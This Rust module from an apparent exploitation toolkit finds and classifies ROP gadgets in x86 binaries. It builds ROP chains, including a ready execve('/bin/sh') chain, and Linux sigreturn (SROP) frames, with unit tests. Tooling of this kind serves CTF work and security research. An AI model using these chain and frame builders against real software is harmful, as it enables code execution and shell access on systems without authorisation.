//! ROP Gadget Discovery
//!
//! Finds and classifies Return-Oriented Programming gadgets in binaries.

use super::*;

/// ROP gadget classification
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum GadgetClass {
    PopReg,
    MovReg,
    XchgReg,
    Syscall,
    Call,
    Jmp,
    Arithmetic,
    Load,
    Store,
    Leave,
    Other,
}

impl std::fmt::Display for GadgetClass {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::PopReg => write!(f, "pop"),
            Self::MovReg => write!(f, "mov"),
            Self::XchgReg => write!(f, "xchg"),
            Self::Syscall => write!(f, "syscall"),
            Self::Call => write!(f, "call"),
            Self::Jmp => write!(f, "jmp"),
            Self::Arithmetic => write!(f, "arith"),
            Self::Load => write!(f, "load"),
            Self::Store => write!(f, "store"),
            Self::Leave => write!(f, "leave"),
            Self::Other => write!(f, "other"),
        }
    }
}

/// A ROP gadget
#[derive(Debug, Clone)]
pub struct Gadget {
    pub address: u64,
    pub bytes: Vec<u8>,
    pub instructions: String,
    pub classification: GadgetClass,
}

impl Gadget {
    pub fn display(&self) -> String {
        format!(
            "0x{:08x}: {} ({})",
            self.address, self.instructions, self.classification
        )
    }

    pub fn hex_bytes(&self) -> String {
        self.bytes
            .iter()
            .map(|b| format!("{:02x}", b))
            .collect::<Vec<_>>()
            .join(" ")
    }
}

/// ROP Gadget Finder
pub struct GadgetFinder {
    max_depth: usize,
    max_bytes: usize,
    arch: Architecture,
}

impl GadgetFinder {
    pub fn new(arch: Architecture) -> Self {
        Self {
            max_depth: 10,
            max_bytes: 20,
            arch,
        }
    }

    pub fn with_depth(mut self, depth: usize) -> Self {
        self.max_depth = depth;
        self
    }

    pub fn find_gadgets(&self, binary: &Binary) -> Vec<Gadget> {
        let mut gadgets = Vec::new();

        let exec_sections: Vec<_> = binary
            .sections
            .iter()
            .filter(|s| s.flags.is_exec())
            .collect();

        for section in exec_sections {
            let Ok(data) = binary.read_section(section) else {
                continue;
            };
            let rets = self.find_terminators(data);

            for ret_offset in rets {
                let addr = section.vaddr + ret_offset as u64;
                gadgets.extend(self.extract_gadgets_at(data, ret_offset, addr));
            }
        }

        gadgets.sort_by(|a, b| a.instructions.cmp(&b.instructions));
        gadgets.dedup_by(|a, b| a.instructions == b.instructions);
        gadgets.sort_by_key(|g| g.address);
        gadgets
    }

    pub fn find_matching(&self, binary: &Binary, pattern: &str) -> Vec<Gadget> {
        let pattern_lower = pattern.to_lowercase();
        self.find_gadgets(binary)
            .into_iter()
            .filter(|g| g.instructions.to_lowercase().contains(&pattern_lower))
            .collect()
    }

    pub fn find_by_class(&self, binary: &Binary, class: GadgetClass) -> Vec<Gadget> {
        self.find_gadgets(binary)
            .into_iter()
            .filter(|g| g.classification == class)
            .collect()
    }

    fn find_terminators(&self, data: &[u8]) -> Vec<usize> {
        let mut offsets = Vec::new();
        for (i, &byte) in data.iter().enumerate() {
            if byte == 0xC3 {
                offsets.push(i);
            } else if byte == 0xC2 && i + 2 < data.len() {
                offsets.push(i);
            } else if byte == 0xCB {
                offsets.push(i);
            } else if byte == 0xCA && i + 2 < data.len() {
                offsets.push(i);
            }
        }
        offsets
    }

    fn extract_gadgets_at(&self, data: &[u8], ret_offset: usize, ret_addr: u64) -> Vec<Gadget> {
        let mut gadgets = Vec::new();
        let start = ret_offset.saturating_sub(self.max_bytes);

        for gadget_start in start..ret_offset {
            let bytes = &data[gadget_start..=ret_offset];
            if let Some(disasm) = self.disassemble(bytes) {
                if !disasm.ends_with("ret") && !disasm.ends_with("retf") {
                    continue;
                }
                let instr_count = disasm.matches(';').count() + 1;
                if instr_count > self.max_depth {
                    continue;
                }

                let classification = self.classify_gadget(&disasm);
                let addr = ret_addr - (ret_offset - gadget_start) as u64;

                gadgets.push(Gadget {
                    address: addr,
                    bytes: bytes.to_vec(),
                    instructions: disasm,
                    classification,
                });
            }
        }
        gadgets
    }

    fn classify_gadget(&self, disasm: &str) -> GadgetClass {
        let lower = disasm.to_lowercase();
        let first_instr = lower.split(';').next().unwrap_or("").trim();

        if first_instr.starts_with("pop ") {
            GadgetClass::PopReg
        } else if first_instr.starts_with("mov ") {
            if first_instr.contains('[') {
                if first_instr.find('[').unwrap() < first_instr.find(',').unwrap_or(usize::MAX) {
                    GadgetClass::Store
                } else {
                    GadgetClass::Load
                }
            } else {
                GadgetClass::MovReg
            }
        } else if first_instr.starts_with("xchg ") {
            GadgetClass::XchgReg
        } else if first_instr.starts_with("syscall") || first_instr.starts_with("int 0x80") {
            GadgetClass::Syscall
        } else if first_instr.starts_with("call ") {
            GadgetClass::Call
        } else if first_instr.starts_with("jmp ") {
            GadgetClass::Jmp
        } else if first_instr.starts_with("add ")
            || first_instr.starts_with("sub ")
            || first_instr.starts_with("xor ")
            || first_instr.starts_with("and ")
            || first_instr.starts_with("or ")
        {
            GadgetClass::Arithmetic
        } else if first_instr.starts_with("leave") {
            GadgetClass::Leave
        } else {
            GadgetClass::Other
        }
    }

    fn disassemble(&self, bytes: &[u8]) -> Option<String> {
        match self.arch {
            Architecture::X86_64 | Architecture::X86 => self.disassemble_x86_64(bytes),
            _ => None,
        }
    }

    fn disassemble_x86_64(&self, bytes: &[u8]) -> Option<String> {
        let mut result = Vec::new();
        let mut offset = 0;

        while offset < bytes.len() {
            let (instr, size) = self.decode_x86_64(&bytes[offset..])?;
            result.push(instr);
            offset += size;
            if result.len() > self.max_depth {
                return None;
            }
        }

        if result.is_empty() {
            None
        } else {
            Some(result.join("; "))
        }
    }

    fn decode_x86_64(&self, bytes: &[u8]) -> Option<(String, usize)> {
        if bytes.is_empty() {
            return None;
        }

        let (rex, rest) = if bytes[0] >= 0x40 && bytes[0] <= 0x4F {
            (Some(bytes[0]), &bytes[1..])
        } else {
            (None, bytes)
        };

        if rest.is_empty() {
            return None;
        }

        let rex_w = rex.map(|r| r & 0x08 != 0).unwrap_or(false);
        let rex_r = rex.map(|r| r & 0x04 != 0).unwrap_or(false);
        let rex_b = rex.map(|r| r & 0x01 != 0).unwrap_or(false);
        let prefix_size = if rex.is_some() { 1 } else { 0 };

        match rest[0] {
            0xC3 => Some(("ret".to_string(), prefix_size + 1)),
            0xC2 if rest.len() >= 3 => {
                let imm = u16::from_le_bytes([rest[1], rest[2]]);
                Some((format!("ret 0x{:x}", imm), prefix_size + 3))
            }
            0xCB => Some(("retf".to_string(), prefix_size + 1)),
            b @ 0x58..=0x5F => {
                let reg = self.reg64((b - 0x58) | if rex_b { 8 } else { 0 }, rex_w);
                Some((format!("pop {}", reg), prefix_size + 1))
            }
            b @ 0x50..=0x57 => {
                let reg = self.reg64((b - 0x50) | if rex_b { 8 } else { 0 }, rex_w);
                Some((format!("push {}", reg), prefix_size + 1))
            }
            0x0F => {
                if rest.len() < 2 {
                    return None;
                }
                match rest[1] {
                    0x05 => Some(("syscall".to_string(), prefix_size + 2)),
                    0x34 => Some(("sysenter".to_string(), prefix_size + 2)),
                    _ => None,
                }
            }
            0x90 => Some(("nop".to_string(), prefix_size + 1)),
            0xC9 => Some(("leave".to_string(), prefix_size + 1)),
            0xCC => Some(("int3".to_string(), prefix_size + 1)),
            b @ 0xB8..=0xBF if rex_w && rest.len() >= 9 => {
                let reg = self.reg64((b - 0xB8) | if rex_b { 8 } else { 0 }, true);
                let imm = u64::from_le_bytes(rest[1..9].try_into().ok()?);
                Some((format!("mov {}, 0x{:x}", reg, imm), prefix_size + 9))
            }
            b @ 0xB8..=0xBF if rest.len() >= 5 => {
                let reg = self.reg64((b - 0xB8) | if rex_b { 8 } else { 0 }, false);
                let imm = u32::from_le_bytes(rest[1..5].try_into().ok()?);
                Some((format!("mov {}, 0x{:x}", reg, imm), prefix_size + 5))
            }
            0x31 if rest.len() >= 2 => {
                let modrm = rest[1];
                let mod_bits = modrm >> 6;
                let reg_bits = (modrm >> 3) & 0x7;
                let rm_bits = modrm & 0x7;
                if mod_bits == 3 {
                    let src = self.reg64(reg_bits | if rex_r { 8 } else { 0 }, rex_w);
                    let dst = self.reg64(rm_bits | if rex_b { 8 } else { 0 }, rex_w);
                    Some((format!("xor {}, {}", dst, src), prefix_size + 2))
                } else {
                    None
                }
            }
            op @ (0x01 | 0x09 | 0x11 | 0x19 | 0x21 | 0x29 | 0x39) if rest.len() >= 2 => {
                let modrm = rest[1];
                let mod_bits = modrm >> 6;
                let reg_bits = (modrm >> 3) & 0x7;
                let rm_bits = modrm & 0x7;
                if mod_bits == 3 {
                    let src = self.reg64(reg_bits | if rex_r { 8 } else { 0 }, rex_w);
                    let dst = self.reg64(rm_bits | if rex_b { 8 } else { 0 }, rex_w);
                    let mnemonic = match op {
                        0x01 => "add",
                        0x09 => "or",
                        0x11 => "adc",
                        0x19 => "sbb",
                        0x21 => "and",
                        0x29 => "sub",
                        0x39 => "cmp",
                        _ => return None,
                    };
                    Some((format!("{} {}, {}", mnemonic, dst, src), prefix_size + 2))
                } else {
                    None
                }
            }
            op @ (0x89 | 0x8B) if rest.len() >= 2 => {
                let modrm = rest[1];
                let mod_bits = modrm >> 6;
                let reg_bits = (modrm >> 3) & 0x7;
                let rm_bits = modrm & 0x7;
                if mod_bits == 3 {
                    let reg1 = self.reg64(reg_bits | if rex_r { 8 } else { 0 }, rex_w);
                    let reg2 = self.reg64(rm_bits | if rex_b { 8 } else { 0 }, rex_w);
                    if op == 0x89 {
                        Some((format!("mov {}, {}", reg2, reg1), prefix_size + 2))
                    } else {
                        Some((format!("mov {}, {}", reg1, reg2), prefix_size + 2))
                    }
                } else {
                    None
                }
            }
            _ => None,
        }
    }

    fn reg64(&self, idx: u8, is_64: bool) -> &'static str {
        if is_64 {
            match idx {
                0 => "rax",
                1 => "rcx",
                2 => "rdx",
                3 => "rbx",
                4 => "rsp",
                5 => "rbp",
                6 => "rsi",
                7 => "rdi",
                8 => "r8",
                9 => "r9",
                10 => "r10",
                11 => "r11",
                12 => "r12",
                13 => "r13",
                14 => "r14",
                15 => "r15",
                _ => "?",
            }
        } else {
            match idx {
                0 => "eax",
                1 => "ecx",
                2 => "edx",
                3 => "ebx",
                4 => "esp",
                5 => "ebp",
                6 => "esi",
                7 => "edi",
                8 => "r8d",
                9 => "r9d",
                10 => "r10d",
                11 => "r11d",
                12 => "r12d",
                13 => "r13d",
                14 => "r14d",
                15 => "r15d",
                _ => "?",
            }
        }
    }
}

/// ROP Chain Builder - fluent API for constructing ROP chains
pub struct RopChain {
    chain: Vec<u8>,
    arch: Architecture,
    gadgets: std::collections::HashMap<String, u64>,
}

impl RopChain {
    /// Create new ROP chain builder
    pub fn new(arch: Architecture) -> Self {
        Self {
            chain: Vec::new(),
            arch,
            gadgets: std::collections::HashMap::new(),
        }
    }

    /// Create for x86_64
    pub fn x86_64() -> Self {
        Self::new(Architecture::X86_64)
    }

    /// Create for x86
    pub fn x86() -> Self {
        Self::new(Architecture::X86)
    }

    /// Register a gadget address for use in the chain
    pub fn register_gadget(mut self, name: &str, addr: u64) -> Self {
        self.gadgets.insert(name.to_string(), addr);
        self
    }

    /// Register multiple gadgets from binary's gadget search
    pub fn register_gadgets(mut self, gadgets: &[Gadget]) -> Self {
        for g in gadgets {
            self.gadgets.insert(g.instructions.clone(), g.address);
        }
        self
    }

    /// Add raw address to chain
    pub fn raw(mut self, addr: u64) -> Self {
        let bytes = match self.arch {
            Architecture::X86 => addr.to_le_bytes()[..4].to_vec(),
            _ => addr.to_le_bytes().to_vec(),
        };
        self.chain.extend(bytes);
        self
    }

    /// Add multiple raw addresses
    pub fn raws(mut self, addrs: &[u64]) -> Self {
        for &addr in addrs {
            self = self.raw(addr);
        }
        self
    }

    /// Add gadget by name (must be registered first)
    pub fn gadget(mut self, name: &str) -> Self {
        if let Some(&addr) = self.gadgets.get(name) {
            self = self.raw(addr);
        }
        self
    }

    /// pop rdi; ret - set first argument (x86_64 calling convention)
    pub fn pop_rdi(self, value: u64) -> Self {
        self.gadget("pop rdi; ret").raw(value)
    }

    /// pop rsi; ret - set second argument
    pub fn pop_rsi(self, value: u64) -> Self {
        self.gadget("pop rsi; ret").raw(value)
    }

    /// pop rdx; ret - set third argument
    pub fn pop_rdx(self, value: u64) -> Self {
        self.gadget("pop rdx; ret").raw(value)
    }

    /// pop rcx; ret - set fourth argument (or counter)
    pub fn pop_rcx(self, value: u64) -> Self {
        self.gadget("pop rcx; ret").raw(value)
    }

    /// pop rax; ret - set syscall number or return value
    pub fn pop_rax(self, value: u64) -> Self {
        self.gadget("pop rax; ret").raw(value)
    }

    /// syscall; ret - execute syscall
    pub fn syscall(self) -> Self {
        self.gadget("syscall; ret")
    }

    /// Call a PLT function with arguments (x86_64)
    pub fn call(self, func_addr: u64, args: &[u64]) -> Self {
        let mut chain = self;

        // Set arguments in order: rdi, rsi, rdx, rcx, r8, r9
        if let Some(&arg) = args.get(0) {
            chain = chain.pop_rdi(arg);
        }
        if let Some(&arg) = args.get(1) {
            chain = chain.pop_rsi(arg);
        }
        if let Some(&arg) = args.get(2) {
            chain = chain.pop_rdx(arg);
        }
        if let Some(&arg) = args.get(3) {
            chain = chain.pop_rcx(arg);
        }

        // Call the function
        chain.raw(func_addr)
    }

    /// Execute execve("/bin/sh", NULL, NULL) syscall
    /// Requires: pop_rdi, pop_rsi, pop_rdx, pop_rax, syscall gadgets
    /// and a "/bin/sh" string address
    pub fn execve_binsh(self, binsh_addr: u64) -> Self {
        self.pop_rdi(binsh_addr) // rdi = "/bin/sh"
            .pop_rsi(0) // rsi = NULL
            .pop_rdx(0) // rdx = NULL
            .pop_rax(59) // rax = 59 (execve)
            .syscall()
    }

    /// Padding with pattern
    pub fn padding(mut self, count: usize, byte: u8) -> Self {
        self.chain.extend(std::iter::repeat(byte).take(count));
        self
    }

    /// Add cyclic pattern for offset detection
    pub fn cyclic(mut self, length: usize) -> Self {
        let pattern = super::PatternGenerator::new(length).generate();
        self.chain.extend(pattern);
        self
    }

    /// Get chain length
    pub fn len(&self) -> usize {
        self.chain.len()
    }

    /// Check if empty
    pub fn is_empty(&self) -> bool {
        self.chain.is_empty()
    }

    /// Build final ROP chain bytes
    pub fn build(self) -> Vec<u8> {
        self.chain
    }

    /// Display chain for debugging
    pub fn display(&self) -> String {
        let ptr_size = match self.arch {
            Architecture::X86 => 4,
            _ => 8,
        };

        let mut output = String::new();
        for (i, chunk) in self.chain.chunks(ptr_size).enumerate() {
            let value = if ptr_size == 4 {
                u32::from_le_bytes(chunk.try_into().unwrap_or([0; 4])) as u64
            } else {
                u64::from_le_bytes(chunk.try_into().unwrap_or([0; 8]))
            };
            output.push_str(&format!("[{}] 0x{:016x}\n", i, value));
        }
        output
    }
}

/// SROP (Sigreturn-Oriented Programming) frame for x86_64
pub struct SigreturnFrame {
    // General purpose registers
    pub r8: u64,
    pub r9: u64,
    pub r10: u64,
    pub r11: u64,
    pub r12: u64,
    pub r13: u64,
    pub r14: u64,
    pub r15: u64,
    pub rdi: u64,
    pub rsi: u64,
    pub rbp: u64,
    pub rbx: u64,
    pub rdx: u64,
    pub rax: u64,
    pub rcx: u64,
    pub rsp: u64,
    pub rip: u64,
    pub eflags: u64,
    // Segment registers
    pub cs: u64,
    pub gs: u64,
    pub fs: u64,
    pub ss: u64,
}

impl Default for SigreturnFrame {
    fn default() -> Self {
        Self::new()
    }
}

impl SigreturnFrame {
    pub fn new() -> Self {
        Self {
            r8: 0,
            r9: 0,
            r10: 0,
            r11: 0,
            r12: 0,
            r13: 0,
            r14: 0,
            r15: 0,
            rdi: 0,
            rsi: 0,
            rbp: 0,
            rbx: 0,
            rdx: 0,
            rax: 0,
            rcx: 0,
            rsp: 0,
            rip: 0,
            eflags: 0,
            cs: 0x33, // User mode code segment
            gs: 0,
            fs: 0,
            ss: 0x2b, // User mode stack segment
        }
    }

    /// Set up for execve("/bin/sh", 0, 0)
    pub fn execve(mut self, binsh_addr: u64, rsp: u64, rip: u64) -> Self {
        self.rax = 59; // execve syscall number
        self.rdi = binsh_addr; // path
        self.rsi = 0; // argv = NULL
        self.rdx = 0; // envp = NULL
        self.rsp = rsp;
        self.rip = rip; // Address of syscall gadget
        self
    }

    /// Convert to bytes (for x86_64 Linux)
    pub fn build(&self) -> Vec<u8> {
        let mut frame = Vec::new();

        // uc_flags
        frame.extend(&0u64.to_le_bytes());
        // uc_link
        frame.extend(&0u64.to_le_bytes());
        // uc_stack.ss_sp
        frame.extend(&0u64.to_le_bytes());
        // uc_stack.ss_flags
        frame.extend(&0u64.to_le_bytes());
        // uc_stack.ss_size
        frame.extend(&0u64.to_le_bytes());

        // General purpose registers
        frame.extend(&self.r8.to_le_bytes());
        frame.extend(&self.r9.to_le_bytes());
        frame.extend(&self.r10.to_le_bytes());
        frame.extend(&self.r11.to_le_bytes());
        frame.extend(&self.r12.to_le_bytes());
        frame.extend(&self.r13.to_le_bytes());
        frame.extend(&self.r14.to_le_bytes());
        frame.extend(&self.r15.to_le_bytes());
        frame.extend(&self.rdi.to_le_bytes());
        frame.extend(&self.rsi.to_le_bytes());
        frame.extend(&self.rbp.to_le_bytes());
        frame.extend(&self.rbx.to_le_bytes());
        frame.extend(&self.rdx.to_le_bytes());
        frame.extend(&self.rax.to_le_bytes());
        frame.extend(&self.rcx.to_le_bytes());
        frame.extend(&self.rsp.to_le_bytes());
        frame.extend(&self.rip.to_le_bytes());
        frame.extend(&self.eflags.to_le_bytes());

        // Segment registers
        frame.extend(&self.cs.to_le_bytes());
        frame.extend(&self.gs.to_le_bytes());
        frame.extend(&self.fs.to_le_bytes());
        frame.extend(&0u64.to_le_bytes()); // err
        frame.extend(&0u64.to_le_bytes()); // trapno
        frame.extend(&0u64.to_le_bytes()); // oldmask
        frame.extend(&0u64.to_le_bytes()); // cr2
        frame.extend(&0u64.to_le_bytes()); // fpstate
        frame.extend(&0u64.to_le_bytes()); // reserved
        frame.extend(&0u64.to_le_bytes()); // reserved
        frame.extend(&self.ss.to_le_bytes());

        frame
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_gadget_class_display() {
        assert_eq!(format!("{}", GadgetClass::PopReg), "pop");
        assert_eq!(format!("{}", GadgetClass::Syscall), "syscall");
    }

    #[test]
    fn test_decode_ret() {
        let finder = GadgetFinder::new(Architecture::X86_64);
        let (instr, size) = finder.decode_x86_64(&[0xC3]).unwrap();
        assert_eq!(instr, "ret");
        assert_eq!(size, 1);
    }

    #[test]
    fn test_decode_pop_edi() {
        // Without REX prefix, 0x5F is "pop edi" (32-bit register)
        let finder = GadgetFinder::new(Architecture::X86_64);
        let (instr, size) = finder.decode_x86_64(&[0x5F]).unwrap();
        assert_eq!(instr, "pop edi");
        assert_eq!(size, 1);
    }

    #[test]
    fn test_decode_pop_rdi_with_rex() {
        // With REX.W prefix, 0x48 0x5F is "pop rdi" (64-bit register)
        let finder = GadgetFinder::new(Architecture::X86_64);
        let (instr, size) = finder.decode_x86_64(&[0x48, 0x5F]).unwrap();
        assert_eq!(instr, "pop rdi");
        assert_eq!(size, 2);
    }

    #[test]
    fn test_rop_chain_basic() {
        let chain = RopChain::x86_64().raw(0xdeadbeef).raw(0xcafebabe).build();

        assert_eq!(chain.len(), 16); // Two 64-bit addresses
    }

    #[test]
    fn test_rop_chain_with_gadgets() {
        let chain = RopChain::x86_64()
            .register_gadget("pop rdi; ret", 0x401234)
            .register_gadget("syscall; ret", 0x401300)
            .pop_rdi(0x68732f6e69622f) // "/bin/sh"
            .syscall()
            .build();

        // Should have: pop_rdi addr, value, syscall addr
        assert_eq!(chain.len(), 24); // 3 * 8 bytes
    }

    #[test]
    fn test_sigreturn_frame() {
        let frame = SigreturnFrame::new()
            .execve(0x4000, 0x7fff0000, 0x401000)
            .build();

        // Frame should be substantial size
        assert!(frame.len() > 100);
    }

    #[test]
    fn test_chain_display() {
        let chain = RopChain::x86_64().raw(0x41414141).raw(0x42424242);

        let display = chain.display();
        assert!(display.contains("0x0000000041414141"));
        assert!(display.contains("0x0000000042424242"));
    }
}
